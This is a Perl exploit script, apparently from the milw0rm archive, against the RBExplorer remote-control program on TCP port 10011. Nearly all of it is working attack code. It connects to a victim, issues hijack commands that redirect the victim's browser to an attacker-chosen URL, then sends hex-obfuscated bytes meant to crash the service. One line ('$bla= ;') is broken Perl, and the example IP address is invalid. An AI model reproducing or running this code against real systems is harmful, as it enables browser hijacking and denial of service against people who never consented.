#!usr/bin/perl
#
#       RBExplorer Hijack Command Exploit
# ----------------------------------------------
#      Infam0us Gr0up - Securiti Research
#
# Info: infamous.2hell.com
# Vendor URL: http://www.kabrian.com /arbie@kabrian.com 
#

use IO::Socket;

if (@ARGV != 3)
{
print "\n RBExplorer Hijack Command Exploit\n";
print "-----------------------------------------\n\n";
print "[!] usage: perl $0 [target] [localIP] [LocalURL]\n";
print "[?] exam: perl $0 192.332.34.4 213.234.12.1 http://hijack.spyp0rn.com\n";
print "\n";
exit ();
}

$adr = $ARGV[0];
$lip = $ARGV[1];
$lurl = $ARGV[2];

$crash =
"\x23\x44\x6f\x77\x6e\x6c\x6f\x61\x64".
"\x57\x48\x4f\x41\x52\x45\x59\x4f\x55\x49".
"\x53\x4e\x4f\x54\x49\x4d\x50\x4f\x52\x54".
"\x41\x4e\x54\x42\x55\x54\x54\x48\x45\x52".
"\x45\x4f\x4e\x45\x57\x41\x59\x54\x4f\x46".
"\x49\x4c\x4c\x46\x52\x45\x45\x49\x42\x45".
"\x4c\x49\x56\x45";

print "\n[+] Connect to $adr..\n";
$remote = IO::Socket::INET->new(Proto=>"\x74\x63\x70", PeerAddr=>$adr,
PeerPort=>10011, Reuse=>1) or die "Error: can't connect to $adr:10011\n";

$chr1 = "\x24\x49\x50\x3a";
$chr2 = "\x23\x4e\x61\x76\x69\x67\x61\x74\x65\x54\x6f";

print "[+] Connected\n";
$remote->autoflush(1);
print $remote "\n";
sleep(1);
print $remote "$chr1 $lip\n" and print "[+] Hijacking $adr...\n" or die
"[-] Error: $lip not listen\n";
sleep(2);
print "[+] $lip listening!\n";
print $remote "$chr2 $lurl\n" and print "[+] Hijacking browser...\n" or die
"[-] Error: hijacking failed\n";
sleep(2);
print "[+] Browser hijacked!\n";
print "[+] Sleep 15 seconds..\n";
sleep(15);
print "[+] Send crash byte..\n";
print $remote "$crash";
sleep(2);
print "[+] DONE\n\n";
print "..press any key to exit\n";
$bla= ;
close $remote;

# milw0rm.com [2005-10-11]
